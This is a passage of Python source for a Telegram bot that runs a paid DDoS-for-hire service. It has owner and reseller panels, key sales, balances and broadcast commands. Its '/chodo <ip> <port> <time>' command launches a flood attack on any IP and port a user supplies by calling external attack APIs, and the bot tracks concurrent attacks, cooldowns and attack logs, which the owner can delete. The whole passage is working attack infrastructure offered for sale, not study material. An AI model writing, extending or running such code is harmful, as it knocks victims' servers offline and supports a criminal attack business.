        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /remove_reseller <id or @username>")
        return
    
    reseller_id, resolved_name = resolve_user(parts[1])
    if not reseller_id or str(reseller_id) not in data["resellers"]:
        bot.reply_to(message, "❌ Reseller nahi mila!")
        return
    
    del data["resellers"][str(reseller_id)]
    save_data(data)
    bot.reply_to(message, f"✅ Reseller {reseller_id} removed!")

@bot.message_handler(commands=["block_reseller"])
def block_reseller_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /block_reseller <id or @username>")
        return
    
    reseller_id, resolved_name = resolve_user(parts[1])
    if not reseller_id or str(reseller_id) not in data["resellers"]:
        bot.reply_to(message, "❌ Reseller nahi mila!")
        return
    
    data["resellers"][str(reseller_id)]['blocked'] = True
    save_data(data)
    bot.reply_to(message, f"🚫 Reseller {reseller_id} blocked!")

@bot.message_handler(commands=["unblock_reseller"])
def unblock_reseller_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /unblock_reseller <id or @username>")
        return
    
    reseller_id, resolved_name = resolve_user(parts[1])
    if not reseller_id or str(reseller_id) not in data["resellers"]:
        bot.reply_to(message, "❌ Reseller nahi mila!")
        return
    
    data["resellers"][str(reseller_id)]['blocked'] = False
    save_data(data)
    bot.reply_to(message, f"✅ Reseller {reseller_id} unblocked!")

@bot.message_handler(commands=["all_resellers"])
def all_resellers_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    if not data["resellers"]:
        bot.reply_to(message, "📋 Koi reseller nahi hai!")
        return
    
    response = "═══════════════════════════\n👥 RESELLER LIST\n═══════════════════════════\n\n"
    
    active = []
    blocked = []
    
    for rid, reseller in data["resellers"].items():
        if reseller.get('blocked'):
            blocked.append(reseller)
        else:
            active.append(reseller)
    
    response += f"🟢 ACTIVE: {len(active)}\n───────────────────────────\n"
    for i, r in enumerate(active[:10], 1):
        response += f"{i}. 👤 {r.get('username', r['user_id'])}\n"
        response += f"   💵 Balance: {r.get('balance', 0)} Rs\n"
        response += f"   🔑 Keys: {r.get('total_keys_generated', 0)}\n\n"
    
    if blocked:
        response += f"🔴 BLOCKED: {len(blocked)}\n───────────────────────────\n"
        for i, r in enumerate(blocked[:5], 1):
            response += f"{i}. 👤 {r.get('username', r['user_id'])}\n"
    
    send_long_message(message, response)

@bot.message_handler(commands=["saldo_add"])
def saldo_add_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /saldo_add <id or @username> <amount>")
        return
    
    reseller_id, resolved_name = resolve_user(parts[1])
    if not reseller_id or str(reseller_id) not in data["resellers"]:
        bot.reply_to(message, "❌ Reseller nahi mila!")
        return
    
    try:
        amount = int(parts[2])
        if amount <= 0:
            bot.reply_to(message, "❌ Amount positive hona chahiye!")
            return
    except:
        bot.reply_to(message, "❌ Invalid amount!")
        return
    
    data["resellers"][str(reseller_id)]['balance'] = data["resellers"][str(reseller_id)].get('balance', 0) + amount
    save_data(data)
    
    bot.reply_to(message, f"✅ Balance Added!\n\n👤 Reseller: {reseller_id}\n➕ Added: {amount} Rs\n💵 New Balance: {data['resellers'][str(reseller_id)]['balance']} Rs")

@bot.message_handler(commands=["saldo_remove"])
def saldo_remove_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /saldo_remove <id or @username> <amount>")
        return
    
    reseller_id, resolved_name = resolve_user(parts[1])
    if not reseller_id or str(reseller_id) not in data["resellers"]:
        bot.reply_to(message, "❌ Reseller nahi mila!")
        return
    
    try:
        amount = int(parts[2])
        if amount <= 0:
            bot.reply_to(message, "❌ Amount positive hona chahiye!")
            return
    except:
        bot.reply_to(message, "❌ Invalid amount!")
        return
    
    current = data["resellers"][str(reseller_id)].get('balance', 0)
    new_balance = max(0, current - amount)
    data["resellers"][str(reseller_id)]['balance'] = new_balance
    save_data(data)
    
    bot.reply_to(message, f"✅ Balance Removed!\n\n👤 Reseller: {reseller_id}\n➖ Removed: {amount} Rs\n💵 New Balance: {new_balance} Rs")

@bot.message_handler(commands=["saldo"])
def saldo_check_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /saldo <id or @username>")
        return
    
    reseller_id, resolved_name = resolve_user(parts[1])
    if not reseller_id or str(reseller_id) not in data["resellers"]:
        bot.reply_to(message, "❌ Reseller nahi mila!")
        return
    
    r = data["resellers"][str(reseller_id)]
    bot.reply_to(message, f"💰 Reseller Balance\n\n👤 User: {reseller_id}\n💵 Balance: {r.get('balance', 0)} Rs\n🔑 Total Keys: {r.get('total_keys_generated', 0)}\n📊 Status: {'🚫 Blocked' if r.get('blocked') else '✅ Active'}")

@bot.message_handler(commands=["mysaldo"])
def my_saldo_command(message):
    user_id = message.from_user.id
    reseller = get_reseller(user_id)
    if not reseller:
        bot.reply_to(message, "❌ Aap reseller nahi ho!")
        return
    if reseller.get('blocked'):
        bot.reply_to(message, "🚫 Aapka panel blocked hai!")
        return
    bot.reply_to(message, f"💰 Your Balance\n\n💵 Balance: {reseller.get('balance', 0)} Rs\n🔑 Total Keys Generated: {reseller.get('total_keys_generated', 0)}")

@bot.message_handler(commands=["prices"])
def prices_command(message):
    user_id = message.from_user.id
    if not is_reseller(user_id) and not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf resellers ke liye hai!")
        return
    
    response = "═══════════════════════════\n💵 KEY PRICING\n═══════════════════════════\n\n"
    for dur, info in RESELLER_PRICING.items():
        response += f"🔴 {info['label']:<9} ➜ {info['price']} Rs\n"
    response += "\n═══════════════════════════\n📋 Usage: /gen <duration> <count>\nExample: /gen 1d 1"
    bot.reply_to(message, response)

@bot.message_handler(commands=["setprice"])
def set_price_command(message):
    global RESELLER_PRICING
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 3:
        current = "\n".join([f"• {dur}: {info['price']} Rs ({info['label']})" for dur, info in RESELLER_PRICING.items()])
        bot.reply_to(message, f"💵 CURRENT PRICING\n\n{current}\n\nUsage: /setprice <duration> <price>\nExample: /setprice 1d 60")
        return
    
    duration_key = parts[1].lower()
    if duration_key not in RESELLER_PRICING:
        bot.reply_to(message, "❌ Invalid duration! Valid: 12h, 1d, 3d, 7d, 30d, 60d")
        return
    
    try:
        new_price = int(parts[2])
        if new_price < 0:
            bot.reply_to(message, "❌ Price 0 se kam nahi ho sakta!")
            return
    except:
        bot.reply_to(message, "❌ Invalid price!")
        return
    
    old_price = RESELLER_PRICING[duration_key]['price']
    RESELLER_PRICING[duration_key]['price'] = new_price
    set_setting(f'price_{duration_key}', new_price)
    
    bot.reply_to(message, f"✅ Price Updated!\n\n📦 Duration: {RESELLER_PRICING[duration_key]['label']}\n💵 Old: {old_price} Rs\n💰 New: {new_price} Rs")

@bot.message_handler(commands=["user_resell"])
def user_resell_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /user_resell <id or @username>")
        return
    
    reseller_id, resolved_name = resolve_user(parts[1])
    if not reseller_id or str(reseller_id) not in data["resellers"]:
        bot.reply_to(message, "❌ Reseller nahi mila!")
        return
    
    users_list = []
    for key, key_doc in data["keys"].items():
        if key_doc.get('created_by') == reseller_id and key_doc.get('used'):
            uid = key_doc.get('used_by')
            if uid:
                user = data["users"].get(str(uid))
                if user:
                    users_list.append(user)
    
    if not users_list:
        bot.reply_to(message, f"📋 Reseller {reseller_id} ke koi users nahi hain!")
        return
    
    response = f"═══════════════════════════\n👤 RESELLER {reseller_id} USERS\n═══════════════════════════\n\n"
    for i, user in enumerate(users_list[:15], 1):
        response += f"{i}. 👤 {user.get('username', 'Unknown')} ({user.get('user_id')})\n"
        response += f"   Key: {user.get('key', 'N/A')}\n\n"
    response += f"📊 Total Users: {len(users_list)}"
    
    send_long_message(message, response)

# ============= BROADCAST =============

pending_broadcast = {}
pending_broadcast_reseller = {}

@bot.message_handler(commands=["broadcast"])
def broadcast_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Usage: /broadcast <message>")
        return
    
    msg = parts[1]
    all_users = list(data["users"].keys())
    
    pending_broadcast[message.from_user.id] = {'msg': msg, 'users': all_users}
    bot.reply_to(message, f"⚠️ Broadcast Confirmation\n\n👥 Users: {len(all_users)}\n\n✅ /confirm_broadcast - Bhejo\n❌ /cancel_broadcast - Cancel")

@bot.message_handler(commands=["broadcast_reseller"])
def broadcast_reseller_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Usage: /broadcast_reseller <message>")
        return
    
    msg = parts[1]
    all_resellers = list(data["resellers"].keys())
    
    pending_broadcast_reseller[message.from_user.id] = {'msg': msg, 'users': all_resellers}
    bot.reply_to(message, f"⚠️ Reseller Broadcast Confirmation\n\n👥 Resellers: {len(all_resellers)}\n\n✅ /confirm_broadcast_reseller - Bhejo\n❌ /cancel_broadcast - Cancel")

@bot.message_handler(commands=["broadcast_paid"])
def broadcast_paid_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Usage: /broadcast_paid <message>")
        return
    
    msg = parts[1]
    paid_users = []
    for uid, user in data["users"].items():
        if user.get('key_expiry') and datetime.fromisoformat(user['key_expiry']) > datetime.now():
            paid_users.append(uid)
    
    pending_broadcast[message.from_user.id] = {'msg': msg, 'users': paid_users}
    bot.reply_to(message, f"⚠️ Paid Broadcast Confirmation\n\n👥 Paid Users: {len(paid_users)}\n\n✅ /confirm_broadcast - Bhejo")

@bot.message_handler(commands=["confirm_broadcast"])
def confirm_broadcast_command(message):
    if not is_owner(message.from_user.id):
        return
    
    if message.from_user.id not in pending_broadcast:
        bot.reply_to(message, "❌ Pehle /broadcast karo!")
        return
    
    data_bc = pending_broadcast[message.from_user.id]
    del pending_broadcast[message.from_user.id]
    
    sent = 0
    failed = 0
    
    for uid in data_bc['users']:
        try:
            bot.send_message(int(uid), f"📢 BROADCAST\n\n{data_bc['msg']}")
            sent += 1
        except:
            failed += 1
        time.sleep(0.1)
    
    bot.reply_to(message, f"✅ Broadcast Sent!\n\n✅ Delivered: {sent}\n❌ Failed: {failed}")

@bot.message_handler(commands=["confirm_broadcast_reseller"])
def confirm_broadcast_reseller_command(message):
    if not is_owner(message.from_user.id):
        return
    
    if message.from_user.id not in pending_broadcast_reseller:
        bot.reply_to(message, "❌ Pehle /broadcast_reseller karo!")
        return
    
    data_bc = pending_broadcast_reseller[message.from_user.id]
    del pending_broadcast_reseller[message.from_user.id]
    
    sent = 0
    failed = 0
    
    for uid in data_bc['users']:
        try:
            bot.send_message(int(uid), f"📢 RESELLER NOTICE\n\n{data_bc['msg']}")
            sent += 1
        except:
            failed += 1
        time.sleep(0.1)
    
    bot.reply_to(message, f"✅ Reseller Broadcast Sent!\n\n✅ Delivered: {sent}\n❌ Failed: {failed}")

@bot.message_handler(commands=["cancel_broadcast"])
def cancel_broadcast_command(message):
    if not is_owner(message.from_user.id):
        return
    
    cancelled = False
    if message.from_user.id in pending_broadcast:
        del pending_broadcast[message.from_user.id]
        cancelled = True
    if message.from_user.id in pending_broadcast_reseller:
        del pending_broadcast_reseller[message.from_user.id]
        cancelled = True
    
    if cancelled:
        bot.reply_to(message, "❌ Broadcast cancelled!")
    else:
        bot.reply_to(message, "ℹ️ Koi pending broadcast nahi hai.")

# ============= ATTACK & SETTINGS =============

@bot.message_handler(commands=["chodo"])
def handle_attack(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if not has_valid_key(user_id):
        bot.reply_to(message, "❌ Tumhare paas valid key nahi hai!\n\n🔑 Key kharidne ke liye /redeem use karo.")
        return
    
    if not is_owner(user_id):
        cooldown = get_user_cooldown(user_id)
        if cooldown > 0:
            bot.reply_to(message, f"⏳ Cooldown active! Wait: {cooldown}s")
            return
    
    if user_has_active_attack(user_id):
        bot.reply_to(message, "❌ Tumhara pehle se ek attack chal raha hai!")
        return
    
    active_count = get_active_attack_count()
    max_concurrent = len(API_LIST)
    if active_count >= max_concurrent:
        bot.reply_to(message, f"❌ Abhi attack lgi hui hai! ({active_count}/{max_concurrent})\n\n/status se check kro")
        return
    
    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "⚠️ Usage: /chodo <ip> <port> <time>\nExample: /chodo 1.1.1.1 80 60")
        return
    
    target, port, duration = parts[1], parts[2], parts[3]
    
    if not validate_target(target):
        bot.reply_to(message, "❌ Invalid IP!")
        return
    
    if is_ip_blocked(target):
        bot.reply_to(message, "🚫 Ye IP blocked hai!")
        return
    
    try:
        port = int(port)
        if port < 1 or port > 65535:
            bot.reply_to(message, "❌ Invalid port! (1-65535)")
            return
        duration = int(duration)
        
        max_time = get_max_attack_time()
        if not is_owner(user_id) and duration > max_time:
            bot.reply_to(message, f"❌ Max time: {max_time}s")
            return
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        api_index = get_free_api_index()
        
        if api_index is None:
            bot.reply_to(message, "❌ Koi free slot nahi mila! Wait karo.")
            return
        
        with _attack_lock:
            user_cooldowns[str(user_id)] = datetime.now() + timedelta(seconds=duration + get_user_cooldown_setting())
            api_in_use[attack_id] = api_index
            active_attacks[attack_id] = {
                'target': target,
                'port': port,
                'duration': duration,
                'user_id': user_id,
                'start_time': datetime.now(),
                'end_time': datetime.now() + timedelta(seconds=duration)
            }
        
        def start_attack():
            try:
                username = message.from_user.username or message.from_user.first_name or str(user_id)
                log_attack(user_id, username, target, port, duration)
                bot.reply_to(message, f"⚡ Attack Started!\n\n🎯 Target: {target}:{port}\n⏱️ Time: {duration}s\n\n📊 /status se check kro")
                
                api_url = API_LIST[api_index].format(ip=target, port=port, time=duration)
                
                def call_api():
                    try:
                        response = requests.get(api_url, timeout=10)
                        print(f"[API] Attack sent to {target}:{port} - Status: {response.status_code}")
                    except Exception as e:
                        print(f"[API] Error: {e}")
                
                t = threading.Thread(target=call_api)
                t.daemon = True
                t.start()
                
                time.sleep(duration)
                
                with _attack_lock:
                    active_attacks.pop(attack_id, None)
                    api_in_use.pop(attack_id, None)
                
                bot.reply_to(message, f"✅ Attack Complete!\n\n🎯 Target: {target}:{port}\n⏱️ Duration: {duration}s")
            except Exception as e:
                with _attack_lock:
                    active_attacks.pop(attack_id, None)
                    api_in_use.pop(attack_id, None)
                print(f"Attack error: {e}")
        
        thread = threading.Thread(target=start_attack)
        thread.daemon = True
        thread.start()
        
    except ValueError:
        bot.reply_to(message, "❌ Port and time must be numbers!")

def build_status_message(user_id):
    get_active_attack_count()
    cooldown = get_user_cooldown(user_id)
    user_attacks = {k: v for k, v in active_attacks.items()}
    user_attack_count = len(user_attacks)
    
    response = "╔══════════════════════════╗\n"
    response += f"║  🔥 ATTACK STATUS 🔥           ║\n"
    response += "╠══════════════════════════╣\n"
    response += f"║  📊 Total Active: {user_attack_count}               ║\n"
    response += "╚══════════════════════════╝\n"
    
    if user_attacks:
        for attack_info in user_attacks.values():
            remaining = (attack_info['end_time'] - datetime.now()).total_seconds()
            if remaining > 0:
                total = attack_info['duration']
                elapsed = total - remaining
                percent = int((elapsed / total) * 100)
                filled = int(percent / 10)
                empty = 10 - filled
                bar = "🟢" * filled + "⚫" * empty
                
                response += f"\n┌─────────────────────────┐\n"
                response += f"│ 🎯 {attack_info['target']}:{attack_info['port']}\n"
                response += f"│ ⏱️ {int(remaining)}s remaining\n"
                response += f"│ {bar} {percent}%\n"
                response += f"└─────────────────────────┘\n"
    else:
        response += "\n💤 Koi active attack nahi\n"
    
    response += f"\n⚙️ Max Time: {get_max_attack_time()}s"
    if cooldown > 0:
        response += f"\n⏳ Cooldown: {cooldown}s"
    return response

@bot.message_handler(commands=["status"])
def status_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if not has_valid_key(user_id) and not is_owner(user_id):
        bot.reply_to(message, "❌ Pehle key purchase karo!")
        return
    
    response = build_status_message(user_id)
    bot.reply_to(message, response)

@bot.message_handler(commands=["concurrent"])
def concurrent_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        current = get_concurrent_limit()
        bot.reply_to(message, f"⚙️ Current Concurrent Limit: {current}\n\nChange: /concurrent <count>")
        return
    
    try:
        new_val = int(parts[1])
        if new_val < 1 or new_val > 10:
            bot.reply_to(message, "❌ Value 1-10 ke beech hona chahiye!")
            return
        set_setting('concurrent_limit', new_val)
        bot.reply_to(message, f"✅ Concurrent Limit set: {new_val}")
    except:
        bot.reply_to(message, "❌ Invalid number!")

@bot.message_handler(commands=["max_attack"])
def max_attack_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, f"⚙️ Current Max Attack Time: {get_max_attack_time()}s\n\nChange: /max_attack <seconds>")
        return
    
    try:
        new_val = int(parts[1])
        if 10 <= new_val <= 600:
            set_setting('max_attack_time', new_val)
            bot.reply_to(message, f"✅ Max Attack Time set: {new_val}s")
        else:
            bot.reply_to(message, "❌ Value 10-600 seconds ke beech hona chahiye!")
    except:
        bot.reply_to(message, "❌ Invalid number!")

@bot.message_handler(commands=["cooldown"])
def cooldown_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, f"⏳ Current Cooldown: {get_user_cooldown_setting()}s\n\nChange: /cooldown <seconds>")
        return
    
    try:
        new_val = int(parts[1])
        if 0 <= new_val <= 3600:
            set_setting('user_cooldown', new_val)
            bot.reply_to(message, f"✅ Cooldown set: {new_val}s")
        else:
            bot.reply_to(message, "❌ Value 0-3600 seconds ke beech hona chahiye!")
    except:
        bot.reply_to(message, "❌ Invalid number!")

@bot.message_handler(commands=["block_ip"])
def block_ip_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /block_ip <ip_prefix>\nExample: /block_ip 192.168.\nExample: /block_ip 10.0.")
        return
    
    if add_blocked_ip(parts[1]):
        bot.reply_to(message, f"✅ IP Blocked!\n\n🚫 Prefix: {parts[1]}\n\nAb {parts[1]}* se shuru hone wale IPs pe attack nahi lagega.")
    else:
        bot.reply_to(message, f"ℹ️ {parts[1]} already blocked!")

@bot.message_handler(commands=["unblock_ip"])
def unblock_ip_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /unblock_ip <ip_prefix>")
        return
    
    if remove_blocked_ip(parts[1]):
        bot.reply_to(message, f"✅ IP Unblocked!\n\n✅ Prefix: {parts[1]}")
    else:
        bot.reply_to(message, f"❌ {parts[1]} not found in blocked list!")

@bot.message_handler(commands=["blocked_ips"])
def blocked_ips_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    blocked = get_blocked_ips()
    if not blocked:
        bot.reply_to(message, "📋 Koi IP blocked nahi hai!")
        return
    
    response = "🚫 BLOCKED IPs\n\n"
    for i, ip in enumerate(blocked, 1):
        response += f"{i}. {ip}*\n"
    response += f"\n📊 Total: {len(blocked)}"
    bot.reply_to(message, response)

@bot.message_handler(commands=["prot_on"])
def prot_on_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    set_setting('port_protection', True)
    bot.reply_to(message, "✅ Port Spam Protection enabled!")

@bot.message_handler(commands=["prot_off"])
def prot_off_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    set_setting('port_protection', False)
    bot.reply_to(message, "✅ Port Spam Protection disabled!")

# ============= MONITORING =============

@bot.message_handler(commands=["live"])
def live_stats_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    uptime = datetime.now() - BOT_START_TIME
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
    
    total_users = len(data["users"])
    active_users = 0
    for user in data["users"].values():
        if user.get('key_expiry') and datetime.fromisoformat(user['key_expiry']) > datetime.now():
            active_users += 1
    
    total_resellers = len(data["resellers"])
    active_keys = len([k for k, v in data["keys"].items() if not v.get('used')])
    total_keys = len(data["keys"])
    active_count = get_active_attack_count()
    max_concurrent = get_concurrent_limit()
    maint_status = "🔴 Enabled" if is_maintenance() else "✅ Disabled"
    
    response = "═══════════════════════════\n"
    response += "📊 SERVER STATISTICS\n"
    response += "═══════════════════════════\n\n"
    response += "🤖 BOT INFORMATION\n"
    response += f"• Uptime: {uptime_str}\n"
    response += f"• Active Attacks: {active_count}/{max_concurrent}\n"
    response += f"• Maintenance: {maint_status}\n\n"
    response += "📈 BOT DATA\n"
    response += f"• Total Users: {total_users}\n"
    response += f"• Active Users: {active_users}\n"
    response += f"• Resellers: {total_resellers}\n"
    response += f"• Available Keys: {active_keys}\n"
    response += f"• Total Keys: {total_keys}\n"
    response += "\n═══════════════════════════"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=["logs"])
def attack_logs_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    if not data["attack_logs"]:
        bot.reply_to(message, "📋 Koi attack logs nahi hai!")
        return
    
    content = "═══════════════════════════\n"
    content += "       ATTACK LOGS REPORT\n"
    content += f"    Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    content += "═══════════════════════════\n\n"
    content += f"Total Attacks: {len(data['attack_logs'])}\n\n"
    content += "───────────────────────────\n"
    
    for i, log in enumerate(data["attack_logs"][-50:], 1):
        content += f"{i}. {log.get('username', 'Unknown')} ({log.get('user_id', 'N/A')})\n"
        content += f"   Target: {log.get('target', 'N/A')}:{log.get('port', 'N/A')}\n"
        content += f"   Duration: {log.get('duration', 'N/A')}s\n"
        if log.get('timestamp'):
            content += f"   Time: {log['timestamp']}\n"
        content += "\n"
    
    content += "═══════════════════════════\n"
    content += f"END OF LOGS - Total: {len(data['attack_logs'])}\n"
    content += "═══════════════════════════"
    
    with open("logs_temp.txt", "w") as f:
        f.write(content)
    
    with open("logs_temp.txt", "rb") as f:
        bot.send_document(message.chat.id, f, caption=f"📊 Attack Logs\n\n⚔️ Total Attacks: {len(data['attack_logs'])}")
    
    os.remove("logs_temp.txt")

@bot.message_handler(commands=["del_logs"])
def delete_logs_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    count = len(data["attack_logs"])
    if count == 0:
        bot.reply_to(message, "📋 Koi logs nahi hai!")
        return
    
    data["attack_logs"] = []
    save_data(data)
    bot.reply_to(message, f"✅ {count} attack logs delete ho gaye!")

# ============= MAINTENANCE =============

@bot.message_handler(commands=["maintenance"])
def maintenance_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Usage: /maintenance <message>\n\nExample: /maintenance Bot update ho raha hai, 10 min wait karo")
        return
    
    set_maintenance(True, parts[1])
    bot.reply_to(message, f"🔧 Maintenance Mode ON!\n\nMessage: {parts[1]}\n\n/ok se band karo")

@bot.message_handler(commands=["ok"])
def ok_command(message):
    if not is_owner(message.from_user.id):
        return
    
    if not is_maintenance():
        bot.reply_to(message, "ℹ️ Maintenance mode pehle se OFF hai!")
        return
    
    set_maintenance(False)
    bot.reply_to(message, "✅ Maintenance Mode OFF!\n\nBot ab normal hai.")

# ============= HELP =============

@bot.message_handler(commands=['help'])
def show_help(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if is_owner(user_id):
        help_text = '''
👑 𝗢𝗪𝗡𝗘𝗥 𝗣𝗔𝗡𝗘𝗟

🔑 𝗞𝗘𝗬 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧:
• /gen <time> <count> - Keys generate
• /key <key> - Key details
• /allkeys - All keys
• /delkey <key> - Key delete
• /del_exp_key - Expired keys delete
• /trail <hrs> <max> - Trail keys
• /reseller_trail <id> <hrs> - Give trail to reseller
• /del_trail - Delete all trail keys

👥 𝗨𝗦𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧:
• /user <id> - User ki poori info
• /allusers - All users
• /extend <id> <time> - Time extend
• /extend_all <time> - Sab ka time extend
• /down <id> <time> - Time kam
• /ban <id> - User ban
• /unban <id> - User unban
• /banned - Banned users
• /tban <id> <time> - Temp ban

💼 𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧:
• /add_reseller <id> - Reseller add
• /remove_reseller <id> - Reseller remove
• /block_reseller <id> - Block
• /unblock_reseller <id> - Unblock
• /all_resellers - Sab resellers
• /saldo_add <id> <amt> - Balance add
• /saldo_remove <id> <amt> - Balance kam
• /saldo <id> - Balance check
• /user_resell <id> - Reseller ke users
• /setprice - Pricing dekho/change

📢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧:
• /broadcast - Sab ko message
• /broadcast_reseller - Resellers ko msg
• /broadcast_paid - Sirf paid users ko msg

⚡ 𝗔𝗧𝗧𝗔𝗖𝗞 & 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦:
• /chodo <ip> <port> <time> - Attack
• /status - Attack status
• /concurrent <limit> - Set limit
• /max_attack <sec> - Max time set
• /cooldown <sec> - Cooldown set
• /block_ip <prefix> - IP block
• /unblock_ip <prefix> - IP unblock
• /blocked_ips - Blocked IPs
• /prot_on - Port Protection ON
• /prot_off - Port Protection OFF

📊 𝗠𝗢𝗡𝗜𝗧𝗢𝗥𝗜𝗡𝗚:
• /live - Server stats
• /logs - Attack logs (txt file)
• /del_logs - Delete all logs

🔧 𝗠𝗔𝗜𝗡𝗧𝗘𝗡𝗔𝗡𝗖𝗘:
• /maintenance <msg> - Maintenance ON
• /ok - Maintenance OFF
'''
    elif is_reseller(user_id):
        help_text = '''
💼 𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥 𝗣𝗔𝗡𝗘𝗟

🆔 𝗜𝗗:
• /id - Apna ID dekho
• /ping - Bot status check

💰 𝗕𝗔𝗟𝗔𝗡𝗖𝗘:
• /mysaldo - Apna balance dekho
• /prices - Key prices dekho

🔑 𝗞𝗘𝗬 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗜𝗢𝗡:
• /gen <duration> <count> - Keys generate
  Durations: 12h, 1d, 3d, 7d, 30d, 60d

⚡ 𝗔𝗧𝗧𝗔𝗖𝗞:
• /redeem <key> - Key redeem karo
• /chodo <ip> <port> <time> - Attack
• /status - Attack status
• /mykey - Key details
'''
    else:
        help_text = '''
🔐 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:
• /id - Apna ID dekho
• /ping - Bot status check
• /redeem <key> - Key redeem karo
• /mykey - Key details dekho
• /status - Attack status dekho
• /chodo <ip> <port> <time> - Attack start karo
'''
    
    bot.reply_to(message, help_text)

@bot.message_handler(commands=["redeem"])
def redeem_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /redeem <key>")
        return
    
    key_input = parts[1]
    key_doc = data["keys"].get(key_input)
    
    if not key_doc:
        bot.reply_to(message, "❌ Invalid key!")
        return
    
    if key_doc.get('used') and key_doc.get('max_users', 1) <= key_doc.get('current_users', 0):
        bot.reply_to(message, "❌ Ye key pehle se use ho chuki hai!")
        return
    
    if key_doc.get('is_trail'):
        user = data["users"].get(str(user_id))
